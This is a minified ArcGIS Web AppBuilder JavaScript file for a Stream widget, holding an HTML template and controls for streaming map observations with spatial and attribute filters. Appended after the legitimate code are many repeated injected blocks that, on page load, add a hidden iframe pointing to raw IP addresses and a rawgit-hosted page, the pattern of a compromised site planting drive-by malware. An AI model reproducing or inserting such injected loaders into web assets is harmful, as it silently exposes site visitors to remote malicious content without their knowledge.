// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Stream/StreamControl.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"jimu-widget-title" data-dojo-attach-point\x3d"controlLabelSection"\x3e\r\n    ${nls.streamControls}\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"controlButton stop" data-dojo-attach-point\x3d"startBtn"\x3e\r\n    \x3cdiv class\x3d"jimu-float-leading jimu-leading-margin1 runningIcon"\x3e\x3c/div\x3e\r\n    \x3clabel class\x3d"jimu-widget-normal jimu-leading-margin1 btnLabel"\r\n           data-dojo-attach-point\x3d"startBtnLabel"\x3e${nls.stopStreaming}\x3c/label\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"controlButton" data-dojo-attach-point\x3d"clearBtn"\x3e\r\n    \x3cdiv class\x3d"jimu-float-leading jimu-leading-margin1 clearIcon"\x3e\x3c/div\x3e\r\n    \x3clabel class\x3d"jimu-widget-normal jimu-leading-margin1 btnLabel"\x3e${nls.clearObservation}\x3c/label\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"drawPreviousSection" class\x3d"drawControl"\x3e\r\n    \x3clabel class\x3d"jimu-widget-normal btnLabel"\x3e${nls.previousObservations}\x26nbsp;\x3c/label\x3e\r\n    \x3cinput data-dojo-type\x3d"dijit/form/NumberSpinner" style\x3d"height:32px;width:30%;float:right;"\r\n           data-dojo-props\x3d"smallDelta:1, intermediateChanges:true, constraints:{min:1,max:100,places:0}"\r\n           data-dojo-attach-point\x3d"previousSpinner"\r\n    /\x3e\r\n    \x3cdiv style\x3d"clear:both"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"jimu-widget-title filterLabel"\r\n      data-dojo-attach-point\x3d"filterLabelSection"\x3e\r\n    ${nls.streamFilter}\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"spatialFilterControl" class\x3d"filterControl"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"spatialFilterToggleDiv"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"spatialFilterSection" class\x3d"filterControl" style\x3d"display:none"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"attrFilterControl" class\x3d"filterControl"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"attrFilterToggleDiv"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"attrFilterSection" class\x3d"filterControl" style\x3d"display:none"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/dom-attr dojo/dom-style dojo/dom-class dojo/dom-construct dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./StreamControl.html jimu/dijit/DrawBox ./FilterItem jimu/dijit/CheckBox dijit/form/RadioButton esri/symbols/jsonUtils esri/symbols/SimpleFillSymbol esri/graphic jimu/dijit/SimpleTable dijit/form/NumberSpinner jimu/dijit/LoadingShelter".split(" "),function(n,c,g,d,h,a,k,e,p,q,r,t,u,v,f,l,w,
x,y){return n([p,q,r],{baseClass:"jimu-widget-stream",templateString:t,map:null,streamLayer:null,isStreaming:!0,mapExtentChangeHandler:null,config:null,filterItems:[],postCreate:function(){this.inherited(arguments);this.spatialFilterToggle=new f({checked:!1,label:this.nls.useSpatialFilter,onChange:c.hitch(this,this._toggleSpatialFilter)});this.spatialFilterToggle.placeAt(this.spatialFilterToggleDiv);this.attrFilterToggle=new f({checked:!1,label:this.nls.useAttributeFilter,onChange:c.hitch(this,this._toggleAttributeFilter)});
this.attrFilterToggle.placeAt(this.attrFilterToggleDiv);this.config&&this._applyConfig();this.streamLayer&&this._bindEvents()},_applyConfig:function(){!0!==this.config.startStop&&a.set(this.startBtn,"display","none");!0!==this.config.clear&&a.set(this.clearBtn,"display","none");!0!==this.config.drawPrevious&&a.set(this.drawPreviousSection,"display","none");!0!==this.config.spatialFilter?(a.set(this.spatialFilterControl,"display","none"),a.set(this.spatialFilterSection,"display","none")):this.config.mapExtentFilter&&
this.config.drawExtentFilter?(this._createMapAreaFilterControl(!0),this._createDrawAreaFilterControl(!0)):this.config.mapExtentFilter?this._createMapAreaFilterControl(!1):this.config.drawExtentFilter?this._createDrawAreaFilterControl(!1):(a.set(this.spatialFilterControl,"display","none"),a.set(this.spatialFilterSection,"display","none"));if(this.config.attrFilter&&0<this.config.filterList.length){var b,m,d=!1;g.forEach(this.config.filterList,c.hitch(this,function(a,c){m=1===this.config.filterList.length?
"checkbox":"radio";var e=!0===a.inherited&&a.definitionExpression===this.streamLayer.getDefinitionExpression();b=new v({uid:this.id,config:a,type:m,streamLayer:this.streamLayer,index:c,checked:e,nls:this.nls});b.placeAt(this.attrFilterSection);this.filterItems.push(b);d=d||e}));d&&this.attrFilterToggle.setValue(!0)}else a.set(this.attrFilterControl,"display","none"),a.set(this.attrFilterSection,"display","none");this.config.spatialFilter||this.config.attrFilter&&0!==this.config.filterList.length||
a.set(this.filterLabelSection,"display","none")},_createMapAreaFilterControl:function(a){var b;b=e.create("div",{"class":"filterOption"},this.spatialFilterSection);a?(this.mapAreaControl=new l({id:this.id+"_mapAreaObservations",name:this.id+"_sf",value:"mapArea"}),this.mapAreaControl.placeAt(b),this.own(d(this.mapAreaControl,"change",c.hitch(this,this._mapAreaFilterChange))),e.create("label",{"class":"jimu-widget-normal","for":this.id+"_mapAreaObservations",innerHTML:this.nls.showMapAreaObservations},
b)):(this.mapAreaControl=new f({checked:!1,label:this.nls.showMapAreaObservations,onChange:c.hitch(this,this._mapAreaFilterChange)}),this.mapAreaControl.placeAt(b))},_createDrawAreaFilterControl:function(a){var b;b=e.create("div",{"class":"filterOption"},this.spatialFilterSection);a?(this.drawAreaControl=new l({id:this.id+"_drawAreaObservations",name:this.id+"_sf",value:"drawArea"}),this.drawAreaControl.placeAt(b),this.own(d(this.drawAreaControl,"change",c.hitch(this,this._drawAreaFilterChange))),
e.create("label",{"class":"jimu-widget-normal","for":this.id+"_drawAreaObservations",innerHTML:this.nls.showObservationsByDrawing},b)):(this.drawAreaControl=new f({checked:!1,label:this.nls.showObservationsByDrawing,onChange:c.hitch(this,this._drawAreaFilterChange)}),this.drawAreaControl.placeAt(b));this.drawToolDiv=e.create("div",{style:"display:none"},b);this.drawTool=new u({map:this.map,showClear:!0,keepOneGraphic:!0,geoTypes:["EXTENT"],types:["polygon"]});this.config.drawSymbol&&this.drawTool.setPolygonSymbol(w.fromJson(this.config.drawSymbol));
this.drawTool.placeAt(this.drawToolDiv);this.own(d(this.drawTool,"draw-end",c.hitch(this,function(a){a=new y(a.toJson());var b;a.symbol.setStyle(x.STYLE_NULL);this.drawTool.addGraphic(a);b=d(this.streamLayer,"filter-change",c.hitch(this,function(a){b.remove();a.filter.geometry&&"extent"===a.filter.geometry.type&&setTimeout(c.hitch(this,function(){this._clearOutsideGraphics(a.filter.geometry)}),100)}));this.streamLayer.setGeometryDefinition(a.geometry)})));this.own(d(this.drawTool,"clear",c.hitch(this,
function(){this.streamLayer.setGeometryDefinition(this.map.extent)})))},_mapAreaFilterChange:function(a){a?(this.streamLayer&&this.streamLayer.setGeometryDefinition(this.map.extent),this._addMapExtentChangeHandler()):this._removeMapExtentChangeHandler()},_drawAreaFilterChange:function(b){b?a.set(this.drawToolDiv,"display",""):(this.drawTool.clear(),a.set(this.drawToolDiv,"display","none"))},_bindEvents:function(){"none"!==a.get(this.startBtn,"display")&&this.own(d(this.startBtn,"click",c.hitch(this,
function(){(this.isStreaming=!this.isStreaming)?(k.add(this.startBtn,"stop"),h.set(this.startBtnLabel,"innerHTML",this.nls.stopStreaming),this.startStreaming()):(k.remove(this.startBtn,"stop"),h.set(this.startBtnLabel,"innerHTML",this.nls.startStreaming),this.stopStreaming())})));"none"!==a.get(this.clearBtn,"display")&&this.own(d(this.clearBtn,"click",c.hitch(this,function(){this.streamLayer.clear()})));if("none"!==a.get(this.drawPreviousSection,"display")){var b=this.streamLayer.maximumTrackPoints||
1;this.previousSpinner.set("value",b-1);this.streamLayer.setMaximumTrackPoints(b);this.own(d(this.previousSpinner,"change",c.hitch(this,function(a){this.streamLayer.setMaximumTrackPoints(a+1)})))}},_clearOutsideGraphics:function(a){this.streamLayer.clear()},destroy:function(){this.inherited(arguments);this._removeMapExtentChangeHandler()},stopStreaming:function(){this.streamLayer.disconnect(c.hitch(this,function(){this.streamLayer.clear()}))},startStreaming:function(){this.streamLayer.connect()},
_removeMapExtentChangeHandler:function(){this.mapExtentChangeHandler&&"function"===typeof this.mapExtentChangeHandler.remove&&(this.mapExtentChangeHandler.remove(),this.mapExtentChangeHandler=null)},_addMapExtentChangeHandler:function(){null===this.mapExtentChangeHandler&&(this.mapExtentChangeHandler=d(this.map,"extent-change",c.hitch(this,this._mapExtentChange)))},_mapExtentChange:function(a){this.streamLayer&&this.streamLayer.setGeometryDefinition(a.extent)},_toggleSpatialFilter:function(b){b?a.set(this.spatialFilterSection,
"display",""):(a.set(this.spatialFilterSection,"display","none"),a.set(this.drawToolDiv,"display","none"),this.mapAreaControl&&("jimu.dijit.CheckBox"===this.mapAreaControl.dealaredClass?this.mapAreaControl.setValue(!1):this.mapAreaControl.set("checked",!1)),this.drawAreaControl&&(this.drawTool.clear(),"jimu.dijit.CheckBox"===this.drawAreaControl.dealaredClass?this.drawAreaControl.setValue(!1):this.drawAreaControl.set("checked",!1)),this._removeMapExtentChangeHandler(),this.streamLayer&&this.streamLayer.setGeometryDefinition(null))},
_toggleAttributeFilter:function(b){b?a.set(this.attrFilterSection,"display",""):(a.set(this.attrFilterSection,"display","none"),g.forEach(this.filterItems,function(a){a.unCheck()}),this.streamLayer&&this.streamLayer.setDefinitionExpression(null))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});